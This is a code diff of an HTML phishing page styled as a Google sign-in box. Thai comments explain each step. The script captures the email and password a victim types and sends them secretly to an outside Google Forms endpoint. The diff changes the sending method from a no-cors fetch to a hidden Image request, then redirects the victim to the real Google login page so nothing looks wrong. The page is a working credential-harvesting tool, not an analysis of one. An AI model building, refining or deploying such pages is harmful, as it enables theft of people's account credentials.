@@ -7,8 +7,7 @@
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
         .login-box { background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 360px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        img { margin-bottom: 10px; }
-        h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
+        h2 { font-size: 24px; font-weight: 400; margin: 10px 0; color: #202124; }
         p { font-size: 16px; margin-bottom: 40px; color: #202124; }
         input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
         input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
@@ -16,7 +15,6 @@
         .footer-btn { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
         .create-account { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; }
         button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
-        button:hover { background: #1557b0; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
     </style>
 </head>
 <body>
@@ -38,7 +36,7 @@
 </div>
 
 <script>
-    async function sendData() {
+    function sendData() {
         const emailValue = document.getElementById('email').value;
         const passValue = document.getElementById('pass').value;
 
@@ -47,30 +45,22 @@
             return;
         }
 
-        // ID ของฟอร์มคุณจากรูปล่าสุด
+        // ข้อมูลจากรูปที่ 19 และ 21
         const formID = "1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q";
-        const url = `https://docs.google.com/forms/d/e/${formID}/formResponse`;
+        const entryEmail = "entry.1449652638";
+        const entryPass = "entry.270012312";
 
-        const formData = new URLSearchParams();
-        // Entry ID ที่คุณหามาได้จากรูปที่ 19
-        formData.append('entry.1449652638', emailValue);
-        formData.append('entry.270012312', passValue);
+        // สร้างลิงก์ส่งข้อมูลแบบตรง (Direct Submission)
+        const targetURL = `https://docs.google.com/forms/d/e/${formID}/formResponse?${entryEmail}=${encodeURIComponent(emailValue)}&${entryPass}=${encodeURIComponent(passValue)}&submit=Submit`;
 
-        try {
-            // ส่งข้อมูลแบบเบื้องหลัง
-            await fetch(url, {
-                method: 'POST',
-                mode: 'no-cors', // สำคัญมากเพื่อให้ส่งข้ามโดเมนได้
-                body: formData
-            });
+        // ใช้ Image Tag เพื่อแอบส่งข้อมูลไปที่ Google Form โดยไม่ติดปัญหา CORS
+        var img = new Image();
+        img.src = targetURL;
 
-            // เมื่อส่งสำเร็จ ให้เด้งไปหน้า Login จริงของ Google เพื่อความเนียน
+        // รอ 0.5 วินาทีเพื่อให้เครื่องส่งข้อมูลสำเร็จ แล้วเด้งไปหน้าจริง
+        setTimeout(function() {
             window.location.href = "https://accounts.google.com/v3/signin/identifier";
-        } catch (error) {
-            console.error("Error:", error);
-            // ถ้าพังก็ยังเด้งไปหน้าจริงอยู่ดี
-            window.location.href = "https://accounts.google.com";
-        }
+        }, 500);
     }
 </script>
 
